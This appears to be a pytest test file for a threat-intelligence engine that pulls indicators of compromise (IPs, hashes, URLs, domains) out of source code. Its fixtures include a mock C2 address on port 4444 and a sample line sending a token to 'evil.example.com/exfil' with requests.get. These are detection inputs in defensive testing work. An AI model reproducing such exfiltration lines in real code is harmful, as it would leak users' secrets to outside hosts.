"""Tests for backend/intelligence/threat_intel.py — Threat Intelligence Engine.

All tests are offline-only.  No real HTTP calls are made.
"""
from __future__ import annotations

import asyncio
import re
from typing import Any, Dict, List

import pytest

from backend.core.confidence import Finding
from backend.intelligence.threat_intel import (
    IOCRecord,
    IOCType,
    ThreatIntelEngine,
    ThreatIntelReport,
    ThreatLevel,
    _detect_ioc_type,
    extract_code_iocs,
    lookup_indicator,
)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────


def _run(coro):
    """Run an async coroutine synchronously for use in sync pytest tests."""
    return asyncio.get_event_loop().run_until_complete(coro)


# ─────────────────────────────────────────────────────────────────────────────
# Test 1 — extract_iocs_from_code detects IPv4 addresses
# ─────────────────────────────────────────────────────────────────────────────


def test_extract_iocs_from_code_finds_ip():
    """Source code containing a bare IP address must produce an IP IOC record."""
    code = """
    # connect to remote C2 server
    SERVER_ADDR = "198.51.100.5"   # TEST-NET-2, safe for docs
    port = 4444
    """
    engine = ThreatIntelEngine()
    ioc_tuples = engine.extract_iocs_from_code(code)

    ip_iocs = [(v, t) for v, t in ioc_tuples if t == IOCType.IP]
    assert ip_iocs, f"Expected at least one IP IOC, got: {ioc_tuples}"

    values = [v for v, _ in ip_iocs]
    assert "198.51.100.5" in values, (
        f"Expected '198.51.100.5' in extracted IPs, got: {values}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Test 2 — extract_iocs_from_code detects SHA-256 hashes
# ─────────────────────────────────────────────────────────────────────────────


def test_extract_iocs_from_code_finds_sha256():
    """Source code containing a 64-hex-char string must produce a SHA-256 IOC."""
    sha256 = "a" * 64   # 64 lowercase hex chars — valid SHA-256 format
    code = f'EXPECTED_CHECKSUM = "{sha256}"'

    engine = ThreatIntelEngine()
    ioc_tuples = engine.extract_iocs_from_code(code)

    sha256_iocs = [(v, t) for v, t in ioc_tuples if t == IOCType.HASH_SHA256]
    assert sha256_iocs, f"Expected at least one SHA-256 IOC, got: {ioc_tuples}"

    values = [v for v, _ in sha256_iocs]
    assert sha256 in values, f"Expected hash '{sha256}' in extracted hashes, got: {values}"


# ─────────────────────────────────────────────────────────────────────────────
# Test 3 — extract_iocs detects URLs
# ─────────────────────────────────────────────────────────────────────────────


def test_extract_iocs_finds_url():
    """Source code containing an http/https URL must produce a URL IOC."""
    code = """
    WEBHOOK = "https://evil.example.com/exfil?token=abc123"
    requests.get(WEBHOOK)
    """
    engine = ThreatIntelEngine()
    ioc_tuples = engine.extract_iocs_from_code(code)

    url_iocs = [(v, t) for v, t in ioc_tuples if t == IOCType.URL]
    assert url_iocs, f"Expected at least one URL IOC, got: {ioc_tuples}"

    values = [v for v, _ in url_iocs]
    assert any("evil.example.com" in v for v in values), (
        f"Expected URL containing 'evil.example.com', got: {values}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Test 4 — ThreatIntelReport model validates correctly
# ─────────────────────────────────────────────────────────────────────────────


def test_threat_report_model():
    """ThreatIntelReport must be constructible with correct field types."""
    record = IOCRecord(
        ioc_value="192.0.2.1",
        ioc_type=IOCType.IP,
        threat_level=ThreatLevel.HIGH,
        confidence=0.87,
        tags=["c2", "botnet"],
        source="alienvault_otx",
        malware_families=["Mirai"],
        description="Known C2 IP",
    )

    report = ThreatIntelReport(
        query_value="192.0.2.1",
        query_type=IOCType.IP,
        matches=[record],
        verdict=ThreatLevel.HIGH,
        summary="IP 192.0.2.1: high threat level (1 feed matched)",
        enrichment={"is_rfc1918": False},
    )

    assert report.query_value == "192.0.2.1"
    assert report.query_type == IOCType.IP
    assert len(report.matches) == 1
    assert report.verdict == ThreatLevel.HIGH
    assert isinstance(report.summary, str) and report.summary

    match = report.matches[0]
    assert match.ioc_value == "192.0.2.1"
    assert match.ioc_type == IOCType.IP
    assert match.threat_level == ThreatLevel.HIGH
    assert match.confidence == pytest.approx(0.87)
    assert "c2" in match.tags
    assert "Mirai" in match.malware_families
    assert match.source == "alienvault_otx"

    # Serialisation round-trip
    as_dict = report.model_dump()
    assert as_dict["verdict"] == "high"
    assert as_dict["query_type"] == "ip"


# ─────────────────────────────────────────────────────────────────────────────
# Test 5 — auto-detect IOC type for ip/hash/url/domain
# ─────────────────────────────────────────────────────────────────────────────


def test_ioc_type_detection_logic():
    """_detect_ioc_type must correctly identify the four primary IOC categories."""
    cases: List[tuple[str, IOCType]] = [
        # IPv4 addresses
        ("192.168.1.1", IOCType.IP),
        ("10.0.0.1", IOCType.IP),
        ("203.0.113.42", IOCType.IP),
        # SHA-256 hash (64 hex chars)
        ("a" * 64, IOCType.HASH_SHA256),
        ("0" * 64, IOCType.HASH_SHA256),
        # URLs
        ("https://example.com/payload", IOCType.URL),
        ("http://malware.test/file.exe", IOCType.URL),
        # Domains (not URLs)
        ("evil.example.com", IOCType.DOMAIN),
        ("malware.io", IOCType.DOMAIN),
    ]

    for value, expected_type in cases:
        detected = _detect_ioc_type(value)
        assert detected == expected_type, (
            f"Expected {expected_type!r} for {value!r}, got {detected!r}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Test 6 — check_for_suspicious_iocs handles empty / whitespace input
# ─────────────────────────────────────────────────────────────────────────────


def test_check_suspicious_iocs_no_crash():
    """check_for_suspicious_iocs must return an empty list for empty input."""
    engine = ThreatIntelEngine()

    # Completely empty string
    result = engine.check_for_suspicious_iocs("")
    assert isinstance(result, list), "Result must be a list"
    assert len(result) == 0, f"Expected empty list for empty input, got: {result}"

    # Whitespace-only string
    result_ws = engine.check_for_suspicious_iocs("   \n\t  ")
    assert isinstance(result_ws, list)
    assert len(result_ws) == 0, f"Expected empty list for whitespace input, got: {result_ws}"

    # Code with no IOCs
    clean_code = """
    def add(a, b):
        return a + b

    GREETING = "Hello, world!"
    """
    result_clean = engine.check_for_suspicious_iocs(clean_code)
    assert isinstance(result_clean, list)
    # No IP/domain/URL/hash in this code — list should be empty
    assert len(result_clean) == 0, (
        f"Expected empty list for clean code, got: {result_clean}"
    )
